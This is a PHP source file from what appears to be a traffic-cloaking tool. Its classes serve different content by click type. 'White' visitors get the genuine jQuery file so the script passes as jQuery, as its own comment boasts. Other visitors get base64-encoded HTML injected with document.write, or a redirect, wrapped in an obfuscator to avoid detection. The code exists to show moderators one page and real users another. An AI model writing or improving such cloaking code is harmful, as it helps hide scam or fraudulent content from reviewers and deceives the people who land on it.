<?php
require_once __DIR__ . '/redirect.php';
class CloakerAction
{
    public string $click_type;
    public string $action;
    public string $value;
    public int $redirect_type;
    
    public function __construct(string $click_type, string $action, string $value, int $redirect_type=0)
    {
        $this->click_type = $click_type;
        $this->action = $action;
        $this->value = $value;
        $this->redirect_type = $redirect_type;
    }
    public function perform(){
        switch ($this->action){
            case 'html':
                echo $this->value;
                break;
            case 'redirect':
                redirect($this->value,$this->redirect_type,true);
                break;
            case 'error':
                http_response_code($this->value);
                break;
            default:
                die($this->value);
        }
    }
}

class JSAction extends CloakerAction
{
    public function __construct(CloakerAction $action)
    {
        parent::__construct($action->click_type, $action->action, $action->value, $action->redirect_type);
    }

    private function js_content_replace():string
    {
        $b64 = base64_encode($this->value);
        $js_code = "document.open();document.write(atob('$b64'));document.close();";
        return $js_code;
    }
    
    private function js_iframe():string
    {
        $b64 = base64_encode($this->value);
        $js_code = "document.open();document.write(atob('$b64'));document.close();";
        return $js_code;
    }

    public function perform(){
        header('Content-Type: text/javascript');

        //for white clicks and js connect we don't need 
        //to change the existing white or to redirect
        //just stay where we are and pretend we are JQuery, haha
        if ($this->click_type === 'white') {
            $jq = get("https://code.jquery.com/jquery-3.6.1.min.js");
            echo $jq['content'];
            return;
        }
        
        switch ($this->action){
            case 'html':
                $js_code = $this->js_content_replace();
                break;
            case 'redirect':
                $url = urldecode($this->value);
                $js_code = jsmetaredirect($url,false);
                break;
            default:
                http_response_code(404); //we CAN'T be here, but... who knows!
                return;
        }
        if (!DebugMethods::on()) {
            $hunter = new HunterObfuscator($js_code);
            echo $hunter->Obfuscate();
        } else {
            echo $js_code;
        }
    }
}
